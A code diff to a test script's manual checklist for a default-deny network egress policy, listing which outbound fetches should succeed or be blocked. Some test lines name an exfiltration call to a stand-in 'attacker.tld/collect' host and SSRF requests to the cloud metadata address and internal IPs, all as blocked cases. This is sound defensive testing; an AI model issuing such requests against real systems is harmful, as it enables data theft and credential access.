@@ -118,13 +118,19 @@ const validToken = await mintToken(APP, USER, DATA_TENANT_SECRET);
 
 console.log(`\n${pass} passed, ${fail} failed`);
 console.log(`
-MANUAL CHECKLIST (need a published net:fetch test app on staging):
-  [ ] app fetch('https://example.com')                  -> 200 (allowed)
-  [ ] app fetch('http://169.254.169.254/latest/meta')   -> blocked (egress_blocked 403)
-  [ ] app fetch('http://127.0.0.1') / 'http://10.0.0.1' -> blocked
-  [ ] app fetch of a public URL that 302 -> 169.254.169.254 -> blocked at the redirect hop
-  [ ] app: import {connect} from 'cloudflare:sockets'   -> fails (no working module)
-  [ ] net:connect email agent: imapFetchUnseen + smtpSend vs a throwaway mailbox -> works
+MANUAL CHECKLIST — DEFAULT-DENY EGRESS (Phase 2). Need a published net app on
+staging that DECLARES network.allowed_destinations: ["example.com"]:
+  [ ] declared host: app fetch('https://example.com')   -> 200 (allowed)
+  [ ] EXFIL BLOCKED: app fetch('https://attacker.tld/collect') -> 403 egress_blocked
+      (undeclared public host — this is the Phase 2 win)
+  [ ] app with NO network.allowed_destinations: ANY fetch -> 403 (default-deny)
+  [ ] SSRF still blocked: fetch('http://169.254.169.254/latest/meta') -> 403
+  [ ] fetch('http://127.0.0.1') / 'http://10.0.0.1'      -> 403
+  [ ] declared host that 302 -> 169.254.169.254          -> blocked at the redirect hop
+  [ ] declared host that 302 -> an UNDECLARED public host -> blocked at the redirect hop
+  [ ] app: import {connect} from 'cloudflare:sockets'    -> fails (no working module)
+  [ ] net:connect email agent declaring imap.host:993 + smtp.host:587:
+      imapFetchUnseen + smtpSend -> works; a non-declared host:port -> throws
   [ ] AGENT_CALLER_SECRET + DATA_TENANT_SECRET set (non-default) on api + data workers
   [ ] observe logs show zero '/data tenant proof missing/invalid' warns -> set DATA_TENANT_ENFORCE=1
 `);
